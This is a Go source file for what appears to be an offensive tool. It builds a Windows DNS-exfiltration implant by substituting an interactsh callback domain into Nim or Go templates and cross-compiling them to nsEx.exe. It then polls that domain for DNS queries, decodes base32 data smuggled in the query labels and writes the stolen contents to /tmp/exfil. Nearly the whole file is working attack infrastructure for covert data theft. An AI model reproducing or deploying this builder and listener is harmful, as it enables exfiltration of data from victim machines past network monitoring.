package main
import (
	"fmt"
	"os"
	"os/exec"
	"time"
	"github.com/projectdiscovery/interactsh/pkg/client"
	"github.com/projectdiscovery/interactsh/pkg/server"
	"regexp"
	"strings"
	"encoding/base32"
	"math/rand"
	"io/ioutil"
)

func addbase32padding(s string) string {
	missing := len(s) % 8
	if missing !=0 {s+=strings.Repeat("=",8-missing)}
	return s
}

func compilethings(url string) string{
	now:=time.Now()
	rand.Seed(now.Unix())
	languages:=[]string{"nim","go"}
	choice:=languages[rand.Intn(len(languages))]
	fmt.Println("",choice)
	switch choice{
	case "nim":
		originalFile:="./nim/dns_exfiltration.nim"
		filedata,_:=ioutil.ReadFile(originalFile)
		filestring:=strings.ReplaceAll(string(filedata),"replaceme.tld",url)
		newdata:=[]byte(filestring)
		_=ioutil.WriteFile("./build/dns_exfiltration.nim",newdata,006)
        	cmd:=exec.Command("nim","c","-d=mingw","--os:windows","--cpu:amd64","--amd64.windows.gcc.exe:x86_64-w64-mingw32-gcc","--amd64.windows.gcc.linkerexe=x86_64-w64-mingw32-gcc","--out:nsEx.exe","build/dns_exfiltration.nim")
	        output, err:=cmd.CombinedOutput()
        	if err != nil{fmt.Println("Error: ",err)}
	        fmt.Printf("Compile output: %v",  string(output))
	case "go":
                originalFile:="./golang/dns_exfiltration.go"
                filedata,_:=ioutil.ReadFile(originalFile)
                filestring:=strings.ReplaceAll(string(filedata),"replaceme.tld",url)
                newdata:=[]byte(filestring)
                _=ioutil.WriteFile("./build/dns_exfiltration.go",newdata,006)
		os.Setenv("GOOS", "windows")
		os.Setenv("GOARCH", "amd64")
		comandstring:="go build -o nsEx.exe build/dns_exfiltration.go"
		cmdParts:=strings.Fields(comandstring)
                cmd:=exec.Command(cmdParts[0], cmdParts[1:]...)
	        output, err:=cmd.CombinedOutput()
	        if err != nil{fmt.Println("Error: ",err)}
	        fmt.Printf("Compile output: %v",  string(output))
	case "python":
	case "rust":
	case "powershell":
	case "bash":
	case "zig":
	}
return "response"
}

func main(){
	client, err := client.New(client.DefaultOptions)
	if err!=nil{panic(err)}
	URL:=client.URL()
	compilethings(URL)
	fmt.Printf("%v\n",URL)
	re := regexp.MustCompile(`;(.*)\.\s*IN\s*TXT`)
	defer client.Close()
	for {
		time.Sleep(30*time.Second)
		client.StartPolling(time.Duration(1*time.Second), func(interaction *server.Interaction){
		if interaction.Protocol == "dns" {
			for _, item := range re.FindAllString(interaction.RawRequest, -1){
				newregex:= regexp.MustCompile(`[A-Z2-7]*\.`)
				matches:=newregex.FindString(strings.ToUpper(item))
				match2:=strings.Trim(strings.Trim(matches, "."), "\x00")
				decoded, err := base32.StdEncoding.DecodeString(addbase32padding(match2))
				if err != nil{fmt.Println("Error: ",err)}
				logfile,err:=os.OpenFile("/tmp/exfil", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err != nil{fmt.Println("Error: ",err)}
				whatever , err := logfile.Write(decoded)
                                if err != nil{fmt.Println("Error: ",err)}
				if whatever !=0{}
				}
			}
		})
	defer client.StopPolling()
	}
}
